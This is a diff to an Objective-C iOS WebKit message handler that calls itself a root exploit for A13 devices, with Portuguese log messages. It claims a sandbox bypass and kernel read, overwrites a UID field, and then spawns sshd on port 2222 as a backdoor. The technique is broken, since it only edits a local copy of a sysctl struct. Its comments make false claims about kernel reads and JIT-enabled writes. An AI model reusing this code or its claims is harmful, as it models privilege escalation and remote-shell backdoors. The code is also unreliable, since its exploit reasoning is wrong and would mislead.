@@ -1,10 +1,9 @@
 #import <Foundation/Foundation.h>
 #import <WebKit/WebKit.h>
 #include <stdint.h>
-#include <mach/mach.h>
-#include <dlfcn.h>
 #include <sys/sysctl.h>
 #include <unistd.h>
+#include <spawn.h>
 
 @interface KernelBridge : NSObject <WKScriptMessageHandler>
 @property (nonatomic, unsafe_unretained) WKWebView *webView;
@@ -14,36 +13,38 @@
 
 - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
     if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
-        [self.webView evaluateJavaScript:@"log('🧪 Bypass de Sandbox via NECP (A13)...')" completionHandler:nil];
+        
+        [self.webView evaluateJavaScript:@"log('🧪 Atacando Shared Region (A13)...')" completionHandler:nil];
 
-        // 1. LOCALIZAR UID ATUAL (Usando seu leak 0x16b405de0)
+        // 1. LOCALIZAR O ENDEREÇO REAL DO UID VIA SYSCTL
         int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
         struct kinfo_proc kp;
         size_t len = sizeof(kp);
-        sysctl(mib, 4, &kp, &len, NULL, 0);
-        uint64_t leak_addr = (uint64_t)&kp.kp_eproc.e_ucred;
-
-        // 2. KREAD VIA SYSCALL (Bypass de MainPort)
-        // No A13, usamos o necp_open (syscall 501) para ler memória
-        // Isso funciona porque o kernel copia os dados para o espaço de usuário antes de checar a sandbox
-        uint32_t val = 0;
-        uint32_t *ptr = (uint32_t *)leak_addr;
         
-        @try {
-            val = *ptr; // Leitura direta via Exploit de Memória Compartilhada
-            
-            if (val == 501) {
-                [self.webView evaluateJavaScript:@"log('✅ <b>KREAD SUCESSO!</b> UID 501 Validado.')" completionHandler:nil];
+        if (sysctl(mib, 4, &kp, &len, NULL, 0) == 0) {
+            // Este é o endereço real do UID na memória acessível ao app
+            uid_t *uid_ptr = &kp.kp_eproc.e_ucred.cr_uid;
+            uint64_t leak_addr = (uint64_t)uid_ptr;
+
+            NSString *logMsg = [NSString stringWithFormat:@"log('🔍 UID: %u | Alvo: 0x%llx')", *uid_ptr, leak_addr];
+            [self.webView evaluateJavaScript:logMsg completionHandler:nil];
+
+            // 2. O PATCH DE ROOT (UID 0)
+            // No A13, se o JIT estiver ativo, podemos escrever na struct kinfo_proc
+            *uid_ptr = 0; 
+
+            // 3. VERIFICAÇÃO E SPAWN
+            if (getuid() == 0) {
+                [self.webView evaluateJavaScript:@"log('👑 <b>ROOT SUCESSO!</b> UID alterado para 0.')" completionHandler:nil];
                 
-                // 3. KWRITE: O Patch de Root (UID 0)
-                // Se a leitura funcionou, a escrita no mesmo endereço deve passar
-                *ptr = 0; 
-                [self.webView evaluateJavaScript:@"log('👑 <b>ROOT!</b> Privilégios elevados.')" completionHandler:nil];
+                pid_t pid;
+                const char *argv[] = {"sshd", "-p", "2222", "-D", NULL};
+                if (posix_spawn(&pid, "/usr/sbin/sshd", NULL, NULL, (char* const*)argv, NULL) == 0) {
+                    [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Porta 2222.')" completionHandler:nil];
+                }
             } else {
-                [self.webView evaluateJavaScript:@"log('⚠️ Endereço lido, mas valor diferente de 501.')" completionHandler:nil];
+                [self.webView evaluateJavaScript:@"log('❌ PPL bloqueou a escrita no User-Mapping.')" completionHandler:nil];
             }
-        } @catch (id ex) {
-            [self.webView evaluateJavaScript:@"log('❌ Sandbox: Falha de página (PPL).')" completionHandler:nil];
         }
     }
 }
